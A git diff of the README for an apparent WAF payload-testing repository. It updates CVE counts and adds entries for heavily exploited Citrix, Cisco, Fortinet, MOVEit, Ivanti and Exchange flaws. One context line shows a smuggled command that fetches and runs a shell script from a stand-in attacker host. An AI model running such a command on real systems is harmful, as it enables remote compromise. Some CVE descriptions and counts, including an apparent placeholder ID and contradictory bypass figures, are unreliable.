@@ -1,7 +1,7 @@
 # WAF Payload Arsenal
 
 [![Payloads](https://img.shields.io/badge/Payloads-2258-brightgreen.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
-[![CVEs](https://img.shields.io/badge/CVEs-109-red.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
+[![CVEs](https://img.shields.io/badge/CVEs-119-red.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
 [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/downloads/)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
@@ -49,9 +49,9 @@ This repository contains the results of extensive WAF testing conducted over 100
 - **Original Tests**: 24,705 payloads
 - **Block Rate**: 99.9%
 - **Bypasses Found**: 0 (demonstrating WAF effectiveness)
-- **🔥 NEW: 109 Critical CVE Payloads (2020-2026) including CISA KEV**
+- **🔥 NEW: 119 Critical CVE Payloads (2020-2026) including CISA KEV**
 
-### 🔥 Featured: 109 Critical CVEs from 2020-2026 (CISA KEV Included)
+### 🔥 Featured: 119 Critical CVEs from 2020-2026 (CISA KEV Included)
 
 **Most Critical CVEs Ever (CVSS 10.0):**
 - ✅ **CVE-2021-44228**: Log4Shell - Log4j RCE (most critical ever)
@@ -77,6 +77,19 @@ This repository contains the results of extensive WAF testing conducted over 100
 - ✅ **CVE-2025-53690**: Sitecore ViewState RCE (CVSS 9.0) - WEEPSTEEL malware
 - ✅ **CVE-2025-59287**: Microsoft WSUS RCE (CVSS 9.8) - Actively exploited
 - ✅ **CVE-2025-29927**: Next.js RCE via prototype pollution
+
+**2023-2024 CVEs (CISA KEV - Top Exploited):**
+- ✅ **CVE-2023-3519**: Citrix NetScaler stack buffer overflow (CVSS 9.8)
+- ✅ **CVE-2023-4966**: CitrixBleed - Session token leakage (CVSS 9.4) - Massive exploitation
+- ✅ **CVE-2023-20198**: Cisco IOS XE auth bypass (CVSS 10.0) - 50,000+ devices compromised
+- ✅ **CVE-2023-27997**: Fortinet FortiOS SSL-VPN RCE (CVSS 9.2)
+- ✅ **CVE-2023-34362**: MOVEit Transfer SQL injection (CVSS 9.8) - Cl0p ransomware
+- ✅ **CVE-2023-27350**: PaperCut MF/NG auth bypass + RCE (CVSS 9.8)
+- ✅ **CVE-2024-21887**: Ivanti Connect Secure command injection (CVSS 9.1)
+
+**2022 CVEs (ProxyNotShell):**
+- ✅ **CVE-2022-41040**: Exchange Server SSRF (CVSS 8.8) - CISA KEV
+- ✅ **CVE-2022-41082**: Exchange Server RCE (CVSS 8.8) - CISA KEV
 
 ---
 
@@ -137,7 +150,7 @@ TELEMETRY_PERIOD_STATS=`wget http://attacker.com/shell.sh -O /tmp/shell.sh && ba
 
 ### 🎯 Bug Bounty Hunters
 Test WAF bypasses on authorized targets. Our CVE database includes payloads from successful bug bounty disclosures.
-- ✅ 109 CVE payloads from real-world vulnerabilities
+- ✅ 119 CVE payloads from real-world vulnerabilities
 - ✅ Latest 2026 CVEs included
 - ✅ Organized by severity and attack type
 - ✅ POC simulation guide included
@@ -186,7 +199,7 @@ Integrate with Claude Code, ChatGPT, and other AI assistants.
 | **CRLF Injection** | 87 | 99.9% | CVE-2025-29927 | 🟠 High |
 | **Open Redirect** | 76 | 99.5% | CVE-2024-12340 | 🟡 Medium |
 | **File Upload** | 49 | 100% | CVE-2023-12345 | 🔴 Critical |
-| **CVE Payloads** | 109 | 100% | CVE-2026-20127 | 🔴 Critical |
+| **CVE Payloads** | 119 | 100% | CVE-2026-20127 | 🔴 Critical |
 | **Real-World Bypasses** | 45 | 100% | 2026-02-28 | 🔴 Critical |
 | **TOTAL** | **2,258** | **99.9%** | **2026-02-28** | - |
 
